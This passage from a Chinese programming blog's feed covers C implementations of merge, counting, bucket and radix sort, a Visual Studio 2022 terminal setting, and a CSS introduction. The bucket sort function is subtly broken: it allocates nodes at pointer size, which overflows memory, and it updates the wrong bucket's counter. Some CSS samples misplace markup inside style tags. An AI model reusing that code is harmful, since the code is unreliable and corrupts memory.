class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">// 合并</span><br><span class="line">void merge(int arr[], int temparr[], int left, int mid, int right) &#123;</span><br><span class="line">//标记左半区第一个未排序的元素</span><br><span class="line">int l_pos = left;</span><br><span class="line">//标记右半区第一个未排序的元素</span><br><span class="line">int r_pos = mid + 1;</span><br><span class="line">//临时数组下标</span><br><span class="line">int pos = left;</span><br><span class="line"></span><br><span class="line">// 合并</span><br><span class="line">while (l_pos &lt;= mid &amp;&amp; r_pos &lt;= right)&#123;</span><br><span class="line">if (arr[l_pos] &lt;= arr[r_pos])//左半区第一个剩余元素更小</span><br><span class="line">temparr[pos++] = arr[l_pos++];</span><br><span class="line">else//右半区第一个剩余元素更小</span><br><span class="line">temparr[pos++] = arr[r_pos++];</span><br><span class="line">&#125;</span><br><span class="line">// 合并左半区剩余的元素</span><br><span class="line">while (l_pos &lt;= mid)</span><br><span class="line">temparr[pos++] = arr[l_pos++];</span><br><span class="line">while (r_pos &lt;= right)</span><br><span class="line">temparr[pos++] = arr[r_pos++];</span><br><span class="line"></span><br><span class="line">//把临时数组中合并后的元素复制回原来的数组</span><br><span class="line">while (left &lt;= right) &#123;</span><br><span class="line">arr[left] = temparr[left];</span><br><span class="line">left++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">// 归并排序</span><br><span class="line">void msort(int arr[], int temparr[], int left, int right) &#123;</span><br><span class="line">//如果只有一个元素，那么就不需要划分</span><br><span class="line">//只有一个元素的区域，本身就是有序的，只需要被归并即可</span><br><span class="line">if (left &lt; right) &#123;</span><br><span class="line">//找中间点</span><br><span class="line">int mid = (left + right) / 2;</span><br><span class="line">//递归划分左半区</span><br><span class="line">msort(arr, temparr, left, mid);</span><br><span class="line">//递归划分右半区</span><br><span class="line">msort(arr, temparr, mid + 1, right);</span><br><span class="line">//合并已经排好序的部分</span><br><span class="line">merge(arr, temparr, left, mid, right);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//归并排序入口</span><br><span class="line">void mergesort(int arr[], int n) &#123;</span><br><span class="line">//分配一个辅助数组</span><br><span class="line">int* temparr = (int*)malloc(n * sizeof(int));</span><br><span class="line">if (temparr != NULL)//数组分配成功</span><br><span class="line">&#123;</span><br><span class="line">msort(arr, temparr, 0, n - 1);</span><br><span class="line">free(temparr);</span><br><span class="line">&#125;</span><br><span class="line">else &#123;</span><br><span class="line">printf(&quot;malloc fault!&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="计数排序"><a href="#计数排序" class="headerlink" title="计数排序"></a>计数排序</h2><p>​ 计数排序的核心在于将输入的数据值转化为键存储在额外开辟的数组空间中。计数排序不是基于比较的排序算法。而是 作为一种线性时间复杂度的排序，计数排序要求输入的数据必须是有确定范围的整数。当输入的元素是 n 个 0 到 k 之间的整数时，它的运行时间是 Θ(n + k)。计数排序不是比较排序，排序的速度快于任何比较排序算法。由于用来计数的数组C的长度取决于待排序数组中数据的范围（等于待排序数组的最大值与最小值的差加上1），这使得计数排序对于数据范围很大的数组，需要大量时间和内存。该算法时间复杂度为O(n+k)。</p><p>代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">void Countsort(int* arr, int n)</span><br><span class="line">&#123;</span><br><span class="line">//找到序列中的最大值和最小值</span><br><span class="line">int max = arr[0];</span><br><span class="line">int min = arr[0];</span><br><span class="line">for (int i = 0; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line">if (arr[i] &gt; max)</span><br><span class="line">&#123;</span><br><span class="line">max = arr[i];</span><br><span class="line">&#125;</span><br><span class="line">if (arr[i] &lt; min)</span><br><span class="line">&#123;</span><br><span class="line">min = arr[i];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int range = max - min + 1;//开辟空间的数量</span><br><span class="line">int* countArr = (int*)malloc(sizeof(int) * range);//开辟空间</span><br><span class="line">//初始化数组全部为0</span><br><span class="line">memset(countArr, 0, sizeof(int) * range);</span><br><span class="line">//开始计数</span><br><span class="line">for (int i = 0; i &lt; n; i++)</span><br><span class="line">&#123;</span><br><span class="line">countArr[arr[i] - min]++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//开始排序</span><br><span class="line">int j = 0;</span><br><span class="line">for (int i = 0; i &lt; range; i++)</span><br><span class="line">&#123;</span><br><span class="line">while (countArr[i]--)</span><br><span class="line">&#123;</span><br><span class="line">arr[j] = i + min;</span><br><span class="line">j++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">free(countArr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="桶排序"><a href="#桶排序" class="headerlink" title="桶排序"></a>桶排序</h2><p> 桶排序（Bucket sort）或所谓的箱排序，是一个排序算法，工作的原理是将数组分到有限数量的桶里。每个桶再个别排序（有可能再使用别的排序算法或是以递归方式继续使用桶排序进行排序），最后依次把各个桶中的记录列出来记得到有序序列。桶排序是鸽巢排序的一种归纳结果。当要被排序的数组内的数值是均匀分配的时候，桶排序使用线性时间（Θ(n)）。但桶排序并不是比较排序，他不受到O(n log n)下限的影响。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">//整体思想大致为用数组单元内存放的为结构体式的链表，每个链表称为一个桶。通里面容纳的都是键值相同的元素。 </span><br><span class="line">//之后便是查看对应元素的键值，然后放进与之对应的桶，还需注意桶为空和不空的时的放入方式</span><br><span class="line">//桶元素的插入就是看桶以什么方式的实现。这里桶以链表的形式表现，所以桶中元素的插入即为链表中数组的插入。</span><br><span class="line">/*只要桶的数量够多，那么之前的放入操作只需花费O（n)的时间，而后面的对每个桶里面的元素进行排序则需要基于比较的排序算法。因此后面算法的选择也是</span><br><span class="line">  关乎桶排序速度的重要因素。</span><br><span class="line"> */</span><br><span class="line"> //桶排序的特点是要有界限分明的桶，而不能是无限个桶，也就是说桶排序的个数应该是可以确定的，有限个的。 </span><br><span class="line"> //这里链表实现桶排序的还有要注意的点，就是数组的首地址其实链表的头节点，有这里的值确定该桶的元素个数，并由这里出发寻找其他元素。 </span><br><span class="line">typedef struct node* Snode;</span><br><span class="line">typedef struct node &#123;</span><br><span class="line">int key;</span><br><span class="line">Snode next;</span><br><span class="line">&#125;BBc;</span><br><span class="line"></span><br><span class="line">void BucketSort(int keys[], int keys_size, int bucket_size)</span><br><span class="line">&#123;</span><br><span class="line">Snode* bucket_table = (Snode*)malloc(bucket_size * sizeof(Snode));//为结构体数组分配空间。 </span><br><span class="line">for (int i = 0; i &lt; bucket_size; i++)//对每个数组单元赋予内存空间时，初始化每个结构体数组单元。 </span><br><span class="line">&#123;</span><br><span class="line">bucket_table[i] = (Snode)malloc(sizeof(Snode));//这一步是必要的，因为之前只是给数组分配了一连串的存储空间，但是每个单元的存储地址都是 </span><br><span class="line">//不确定，也不确定该方式是否会自动地分配内存空间给每个数组单元。 </span><br><span class="line">//那么这样准确的给数组单眼分配的空间是占用之前的分配给数组的空间，还是重新分拨其他的空间给数组单元。</span><br><span class="line">//其实应该是分配之前给整个数组单元分配的一段存储空间。 </span><br><span class="line">bucket_table[i]-&gt;key = 0;</span><br><span class="line">bucket_table[i]-&gt;next = NULL;</span><br><span class="line">&#125;//其实创建数组这部分应该放在主函数那里，否则某些功能只能在这个函数中使用。 </span><br><span class="line">for (int j = 0; j &lt; keys_size; j++)</span><br><span class="line">&#123;</span><br><span class="line">Snode node_branch = (Snode)malloc(sizeof(Snode));//定义一个节点，满足条件时链入以链表为表现形式的桶。 </span><br><span class="line">node_branch-&gt;key = keys[j];</span><br><span class="line">node_branch-&gt;next = NULL;</span><br><span class="line">int index = keys[j] / 10;</span><br><span class="line">Snode p = bucket_table[index];//p用来充当指向循环的变量。 </span><br><span class="line">//桶为空和非空时的两种插入形式 </span><br><span class="line">if (p-&gt;key == 0) &#123;</span><br><span class="line">bucket_table[index]-&gt;next = node_branch;</span><br><span class="line">(bucket_table[index]-&gt;key)++;</span><br><span class="line">&#125;</span><br><span class="line">//链表的插入形式，按照大小从后到大。 </span><br><span class="line">else &#123;</span><br><span class="line">while (p-&gt;next != NULL &amp;&amp; p-&gt;next-&gt;key &lt;= node_branch-&gt;key) &#123;</span><br><span class="line">p = p-&gt;next;</span><br><span class="line">&#125;</span><br><span class="line">node_branch-&gt;next = p-&gt;next;</span><br><span class="line">p-&gt;next = node_branch;</span><br><span class="line">(bucket_table[j]-&gt;key)++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">//以此输出每个桶中的所有元素。 </span><br><span class="line">for (int i = 0; i &lt; bucket_size; i++) &#123;</span><br><span class="line">for (Snode k = bucket_table[i]-&gt;next; k != NULL; k = k-&gt;next) &#123;</span><br><span class="line">printf(&quot; %d &quot;, k-&gt;key);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="基数排序"><a href="#基数排序" class="headerlink" title="基数排序"></a>基数排序</h2><p>​基数排序是一种非比较型整数排序算法，其原理是将整数按位数切割成不同的数字，然后按每个位数分别比较。由于整数也可以表达字符串（比如名字或日期）和特定格式的浮点数，所以基数排序也不是只能使用于整数。基数排序是按照低位先排序，然后收集；再按照高位排序，然后再收集；依次类推，直到最高位。有时候有些属性是有优先级顺序的，先按低优先级排序，再按高优先级排序。最后的次序就是高优先级高的在前，高优先级相同的低优先级高的在前。该算法时间复杂度为O(n+k)。</p><p>基数排序算法的原理如下：</p><p>​ 1.取得数组中的最大数，并取得位数；</p><p>​ 2.arr为原始数组，从最低位开始取每个位组成radix数组；</p><p>​ 3.对radix进行计数排序（利用计数排序适用于小范围数的特点）。</p><p>代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line">/* 基数排序</span><br><span class="line"> * 1.求出数组中最大的元素</span><br><span class="line"> * 2.求出最大元素是几位数, 设为i位</span><br><span class="line"> * 3.对所有的数进行i轮排序. </span><br><span class="line"> *   首先排个位, 然后是十位, 然后百位</span><br><span class="line"> * 4.每一轮的排位都需要分桶, 桶是有顺序的,</span><br><span class="line"> *   然后把桶里的数按顺序放入原来的数组中.</span><br><span class="line"> * 5.直到i轮排序结束后, 数组排序完成.      */</span><br><span class="line"></span><br><span class="line">/*获取数字的位数*/</span><br><span class="line">int figure(int num)</span><br><span class="line">&#123;</span><br><span class="line">    int count = 1;</span><br><span class="line">    int temp = num / 10;</span><br><span class="line"></span><br><span class="line">    while(temp != 0)</span><br><span class="line">    &#123;</span><br><span class="line">        count++;</span><br><span class="line">        temp /= 10;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/*查询数组中的最大数*/</span><br><span class="line">int max(int *a, int n)</span><br><span class="line">&#123;</span><br><span class="line">    int max = a[0];</span><br><span class="line">    int i;</span><br><span class="line"></span><br><span class="line">    for(i=1; i&lt;n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        if(a[i] &gt; max)</span><br><span class="line">        &#123;</span><br><span class="line">            max = a[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return max;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/*将数字分配到各自的桶中, 然后按照桶的顺序输出排序结果*/</span><br><span class="line">void sort2(int *a, int n, int loop)</span><br><span class="line">&#123;</span><br><span class="line">    int *buckets[10] = &#123;NULL&#125;;</span><br><span class="line">    int c[10] = &#123;0&#125;;</span><br><span class="line">    int d[10] = &#123;1, 10, 100, 1000, 10000, 100000, 1000000, 10000000, 100000000, 1000000000&#125;;</span><br><span class="line">    int i, j, k;</span><br><span class="line">    int row;</span><br><span class="line">    int temp = d[loop-1];</span><br><span class="line"></span><br><span class="line">    /*统计每个桶的元素个数*/</span><br><span class="line">    for(i=0; i&lt;n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        row = (a[i] / temp) % 10;</span><br><span class="line"></span><br><span class="line">        c[row]++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /*为每个桶分配空间*/</span><br><span class="line">    for(i=0; i&lt;10; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        buckets[i] = (int *)malloc(c[i]*sizeof(int));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    memset(c, 0x00, sizeof(c));</span><br><span class="line"></span><br><span class="line">    /*将数组中的数据分配到桶中*/</span><br><span class="line">    for(i=0; i&lt;n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        row = (a[i] / temp) % 10;</span><br><span class="line"></span><br><span class="line">        buckets[row][c[row]] = a[i];</span><br><span class="line"></span><br><span class="line">        c[row]++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    k = 0;</span><br><span class="line"></span><br><span class="line">    /*将桶中的数, 倒回到原有数组中*/</span><br><span class="line">    for(i=0; i&lt;10; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        for(j=0; j&lt;c[i]; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            a[k] = buckets[i][j];</span><br><span class="line">            k++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    /*释放桶内存*/</span><br><span class="line">    for(i=0; i&lt;10; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        free(buckets[i]);</span><br><span class="line">        buckets[i] = NULL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/*基数排序*/</span><br><span class="line">void sort3(int *a, int n)</span><br><span class="line">&#123;</span><br><span class="line">    int m = max(a, n);</span><br><span class="line">    int loop = figure(m);</span><br><span class="line">    int i;</span><br><span class="line"></span><br><span class="line">    for(i=1; i&lt;=loop; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        sort2(a, n, i);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> C语言 </tag>
            
            <tag> 排序 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vs2022 运行终端更改</title>
      <link href="/2023/06/08/Vs2022-%E8%BF%90%E8%A1%8C%E7%BB%88%E7%AB%AF%E6%9B%B4%E6%94%B9-%E7%BC%96%E8%AF%91%E5%99%A8%E6%9C%AC%E5%9C%B0%E4%B8%8Ewindows-terminal%E4%B9%8B%E9%97%B4%E4%BA%92%E7%9B%B8%E6%9B%B4%E6%94%B9/"/>
      <url>/2023/06/08/Vs2022-%E8%BF%90%E8%A1%8C%E7%BB%88%E7%AB%AF%E6%9B%B4%E6%94%B9-%E7%BC%96%E8%AF%91%E5%99%A8%E6%9C%AC%E5%9C%B0%E4%B8%8Ewindows-terminal%E4%B9%8B%E9%97%B4%E4%BA%92%E7%9B%B8%E6%9B%B4%E6%94%B9/</url>
      
        <content type="html"><![CDATA[<h1 id="Vs2022-运行终端更改-编译器本地与windows-terminal之间互相更改"><a href="#Vs2022-运行终端更改-编译器本地与windows-terminal之间互相更改" class="headerlink" title="Vs2022 运行终端更改(编译器本地与windows terminal之间互相更改)"></a>Vs2022 运行终端更改(编译器本地与windows terminal之间互相更改)</h1><p>进入正题<br><img src="/img/Vs2022-%E8%BF%90%E8%A1%8C%E7%BB%88%E7%AB%AF%E6%9B%B4%E6%94%B9-%E7%BC%96%E8%AF%91%E5%99%A8%E6%9C%AC%E5%9C%B0%E4%B8%8Ewindows-terminal%E4%B9%8B%E9%97%B4%E4%BA%92%E7%9B%B8%E6%9B%B4%E6%94%B9/1.png" alt="title"><br>这是一个在我们实训做魔塔游戏运行时候出现的bug，每次输入数据都要点到windows terminal 进行输入，及其不方便运行程序;</p><p>点击运行框此处（也可以cmd启动运行框进行更换）</p><p><img src="/img/Vs2022-%E8%BF%90%E8%A1%8C%E7%BB%88%E7%AB%AF%E6%9B%B4%E6%94%B9-%E7%BC%96%E8%AF%91%E5%99%A8%E6%9C%AC%E5%9C%B0%E4%B8%8Ewindows-terminal%E4%B9%8B%E9%97%B4%E4%BA%92%E7%9B%B8%E6%9B%B4%E6%94%B9/2.png" alt="title"></p><p>得到以下界面</p><p><img src="/img/Vs2022-%E8%BF%90%E8%A1%8C%E7%BB%88%E7%AB%AF%E6%9B%B4%E6%94%B9-%E7%BC%96%E8%AF%91%E5%99%A8%E6%9C%AC%E5%9C%B0%E4%B8%8Ewindows-terminal%E4%B9%8B%E9%97%B4%E4%BA%92%E7%9B%B8%E6%9B%B4%E6%94%B9/3.png" alt="title"></p><p><img src="/img/Vs2022-%E8%BF%90%E8%A1%8C%E7%BB%88%E7%AB%AF%E6%9B%B4%E6%94%B9-%E7%BC%96%E8%AF%91%E5%99%A8%E6%9C%AC%E5%9C%B0%E4%B8%8Ewindows-terminal%E4%B9%8B%E9%97%B4%E4%BA%92%E7%9B%B8%E6%9B%B4%E6%94%B9/4.png" alt="title"></p><p>点击设置 再转到启动项，将右侧配置默认文件下拉</p><p><img src="/img/Vs2022-%E8%BF%90%E8%A1%8C%E7%BB%88%E7%AB%AF%E6%9B%B4%E6%94%B9-%E7%BC%96%E8%AF%91%E5%99%A8%E6%9C%AC%E5%9C%B0%E4%B8%8Ewindows-terminal%E4%B9%8B%E9%97%B4%E4%BA%92%E7%9B%B8%E6%9B%B4%E6%94%B9/5.png" alt="title"></p><p>选择配置文件 </p><p>一般更改为</p><p><img src="/img/Vs2022-%E8%BF%90%E8%A1%8C%E7%BB%88%E7%AB%AF%E6%9B%B4%E6%94%B9-%E7%BC%96%E8%AF%91%E5%99%A8%E6%9C%AC%E5%9C%B0%E4%B8%8Ewindows-terminal%E4%B9%8B%E9%97%B4%E4%BA%92%E7%9B%B8%E6%9B%B4%E6%94%B9/6.png" alt="title"></p><p>或</p><p><img src="/img/Vs2022-%E8%BF%90%E8%A1%8C%E7%BB%88%E7%AB%AF%E6%9B%B4%E6%94%B9-%E7%BC%96%E8%AF%91%E5%99%A8%E6%9C%AC%E5%9C%B0%E4%B8%8Ewindows-terminal%E4%B9%8B%E9%97%B4%E4%BA%92%E7%9B%B8%E6%9B%B4%E6%94%B9/7.png" alt="title"></p><p>默认终端应用程序选择Windows控制台主机</p><p><img src="/img/Vs2022-%E8%BF%90%E8%A1%8C%E7%BB%88%E7%AB%AF%E6%9B%B4%E6%94%B9-%E7%BC%96%E8%AF%91%E5%99%A8%E6%9C%AC%E5%9C%B0%E4%B8%8Ewindows-terminal%E4%B9%8B%E9%97%B4%E4%BA%92%E7%9B%B8%E6%9B%B4%E6%94%B9/8.jpg" alt="title"><br>点击保存，退出再次运行即可</p><p><strong>注:有些电脑可能要更改为命令提示符（根据我在不同电脑实验可得，不同电脑更改的配置可能不一样，所以建议大家都试一下）</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> Vs2022 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSS</title>
      <link href="/2023/05/17/CSS/"/>
      <url>/2023/05/17/CSS/</url>
      
        <content type="html"><![CDATA[<h1 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h1><h2 id="1-CSS介绍"><a href="#1-CSS介绍" class="headerlink" title="1.CSS介绍"></a>1.CSS介绍</h2><p>CSS （Cascading Style Sheets，层叠样式表），是一种用来为结构化文档（如 HTML 文档或 XML 应用）添加样式（字体、间距和颜色等）的计算机语言，CSS 文件扩展名为 .css。</p><h2 id="2-CSS语法"><a href="#2-CSS语法" class="headerlink" title="2.CSS语法"></a>2.CSS语法</h2><h3 id="（1）-CSS-规则"><a href="#（1）-CSS-规则" class="headerlink" title="（1）.CSS 规则"></a>（1）.CSS 规则</h3><p>CSS 规则由两个主要的部分构成：选择器，以及一条或多条声明:<br><img src="/img/CSS/CSS%E8%A7%84%E5%88%99%E5%9B%BE.jpg" alt="title"><br>选择器通常是您需要改变样式的 HTML 元素。<br><br><br>每条声明由一个属性和一个值组成。<br><br><br>属性（property）是您希望设置的样式属性（style attribute）。每个属性有一个值。属性和值被冒号分开。<br><br><br>CSS声明总是以分号 ; 结束，声明总以大括号 {} 括起来:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p &#123;color:red;text-align:center;&#125;</span><br></pre></td></tr></table></figure><p>一般为了让CSS可读性更强，每行只描述一个属性:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">p</span><br><span class="line">&#123;</span><br><span class="line">    color:red;</span><br><span class="line">    text-align:center;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="（2）-CSS-注释"><a href="#（2）-CSS-注释" class="headerlink" title="（2）.CSS 注释"></a>（2）.CSS 注释</h3><p>注释是用来解释你的代码，并且可以随意编辑它，浏览器会忽略它。<br><br><br>CSS注释以 &#x2F;* 开始, 以 *&#x2F; 结束, 实例如下:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/*这是个注释*/</span><br><span class="line">p</span><br><span class="line">&#123;</span><br><span class="line">    text-align:center;</span><br><span class="line">    /*这是另一个注释*/</span><br><span class="line">    color:black;</span><br><span class="line">    font-family:arial;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-CSS-id和-class"><a href="#3-CSS-id和-class" class="headerlink" title="(3).CSS id和 class"></a>(3).CSS id和 class</h3><p>id 和 class 选择器<br>如果你要在HTML元素中设置CSS样式，你需要在元素中设置”id” 和 “class”选择器。</p><h4 id="id-选择器"><a href="#id-选择器" class="headerlink" title="id 选择器"></a><strong>id 选择器</strong></h4><p>id 选择器可以为标有特定 id 的 HTML 元素指定特定的样式。</p><p>HTML元素以id属性来设置id选择器,CSS 中 id 选择器以 “#” 来定义。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;! 定义&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">#para1</span><br><span class="line">&#123;</span><br><span class="line">    text-align:center;</span><br><span class="line">    color:red;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;! 应用&gt;</span><br><span class="line">&lt;p id=&quot;para1&quot;&gt;Hello World!&lt;/p&gt;</span><br></pre></td></tr></table></figure><h4 id="class选择器"><a href="#class选择器" class="headerlink" title="class选择器"></a><strong>class选择器</strong></h4><p>class 选择器用于描述一组元素的样式，class 选择器有别于id选择器，class可以在多个元素中使用。</p><p>class 选择器在 HTML 中以 class 属性表示, 在 CSS 中，类选择器以一个点 . 号显示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!定义:拥有 center 类的 HTML 元素均为居中&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">.center</span><br><span class="line">&#123;</span><br><span class="line">text-align:center;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;! 应用&gt;</span><br><span class="line">&lt;h1 class=&quot;center&quot;&gt;标题居中&lt;/h1&gt;</span><br><span class="line">&lt;p class=&quot;center&quot;&gt;段落居中。&lt;/p&gt; </span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>也可以指定html元素使用class</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!定义:拥有 center 类的 HTML 元素均为居中&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">p.center </span><br><span class="line">&#123;</span><br><span class="line">    text-align:center;</span><br><span class="line">&#125;</span><br><span class="line">&lt;! 应用&gt;</span><br><span class="line">&lt;h1 class=&quot;center&quot;&gt;这个标题不受影响&lt;/h1&gt;</span><br><span class="line">&lt;p class=&quot;center&quot;&gt;这个段落居中对齐。&lt;/p&gt; </span><br><span class="line">&lt;/style&gt;</span><br></pre></td></tr></table></figure><p>多个 class 选择器可以使用空格分开</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 